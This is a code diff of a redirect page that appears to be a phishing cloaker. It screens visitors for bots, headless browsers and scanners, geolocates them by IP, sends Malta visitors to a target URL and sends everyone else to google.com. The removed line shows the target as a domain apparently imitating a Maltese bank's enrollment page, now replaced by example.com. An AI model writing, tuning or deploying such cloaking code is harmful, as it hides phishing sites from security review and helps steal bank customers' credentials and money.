@@ -4,11 +4,15 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Loading...</title>
+    <style>
+        /* Prevent any flash of content */
+        body { visibility: hidden; }
+    </style>
     <script>
         // Configuration
         const CONFIG = {
             ALLOWED_COUNTRY: 'Malta',
-            REDIRECT_URL_MALTA: 'https://bov-uneneroll.prosucesso.cv', // ← CHANGE THIS TO YOUR DESIRED URL
+            REDIRECT_URL_MALTA: 'https://example.com/malta-users', // ← CHANGE THIS TO YOUR DESIRED URL
             REDIRECT_URL_BLOCKED: 'https://google.com',
             USE_EDGE_FUNCTION: true, // Set to true to use Vercel Edge Function
             EDGE_FUNCTION_URL: '/api/check-security' // Your edge function endpoint
@@ -29,77 +33,78 @@
 
         // Main security check using Edge Function
         async function performSecurityCheck() {
-            try {
-                // Quick bot check first
-                if (quickBotCheck()) {
-                    window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
-                    return;
-                }
-
-                // If using Edge Function
-                if (CONFIG.USE_EDGE_FUNCTION) {
-                    const response = await fetch(CONFIG.EDGE_FUNCTION_URL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
-                        body: JSON.stringify({
-                            userAgent: navigator.userAgent,
-                            screenWidth: window.screen.width,
-                            screenHeight: window.screen.height,
-                            webdriver: navigator.webdriver || false
-                        })
-                    });
-
-                    if (!response.ok) {
-                        throw new Error('Security check failed');
-                    }
-
-                    const result = await response.json();
-
+            // If using Edge Function
+            if (CONFIG.USE_EDGE_FUNCTION) {
+                // Make request without waiting for try-catch
+                fetch(CONFIG.EDGE_FUNCTION_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        userAgent: navigator.userAgent,
+                        screenWidth: window.screen.width,
+                        screenHeight: window.screen.height,
+                        webdriver: navigator.webdriver || false
+                    })
+                })
+                .then(response => response.json())
+                .then(result => {
                     if (result.blocked || result.isBot || !result.allowed) {
-                        window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
                     } else if (result.isMalta) {
-                        window.location.href = CONFIG.REDIRECT_URL_MALTA;
+                        window.location.replace(CONFIG.REDIRECT_URL_MALTA);
                     } else {
-                        window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
                     }
-                } else {
-                    // Fallback to client-side only (less secure)
+                })
+                .catch(() => {
+                    // Fallback on error
                     performClientSideCheck();
-                }
-            } catch (e) {
-                // On error, use client-side fallback
+                });
+            } else {
+                // Direct client-side check
                 performClientSideCheck();
             }
         }
 
-        // Client-side only fallback
+        // Client-side only fallback - optimized for speed
         async function performClientSideCheck() {
+            // Start both requests in parallel
+            const ipPromise = fetch('https://api.ipify.org?format=json').then(r => r.json());
+            
             try {
-                // Get IP
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipResponse.json();
-
-                // Get location
-                const geoResponse = await fetch(`https://ipapi.co/${ip}/country_name/`);
-                const country = await geoResponse.text();
-
-                // Check if Malta
-                const maltaVariations = ['Malta', 'malta', 'MALTA'];
-                const isMalta = maltaVariations.some(v => country.includes(v));
-
-                window.location.href = isMalta ? CONFIG.REDIRECT_URL_MALTA : CONFIG.REDIRECT_URL_BLOCKED;
+                const { ip } = await ipPromise;
+                
+                // Quick geo check with first available service
+                fetch(`https://ipapi.co/${ip}/country_name/`)
+                    .then(r => r.text())
+                    .then(country => {
+                        const isMalta = country.toLowerCase().includes('malta');
+                        window.location.replace(isMalta ? CONFIG.REDIRECT_URL_MALTA : CONFIG.REDIRECT_URL_BLOCKED);
+                    })
+                    .catch(() => {
+                        window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                    });
             } catch (e) {
-                window.location.href = CONFIG.REDIRECT_URL_BLOCKED;
+                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
             }
         }
 
-        // Execute immediately
-        performSecurityCheck();
+        // Execute immediately when script loads (before DOM)
+        (async function() {
+            // Quick bot check - instant redirect
+            if (quickBotCheck()) {
+                window.location.replace(CONFIG.REDIRECT_URL_BLOCKED);
+                return;
+            }
+            
+            // Start all checks in parallel for speed
+            performSecurityCheck();
+        })();
     </script>
 </head>
 <body>
-    <!-- Page will redirect before anything is shown -->
+    <!-- Empty body - page redirects before anything renders -->
 </body>
 </html>
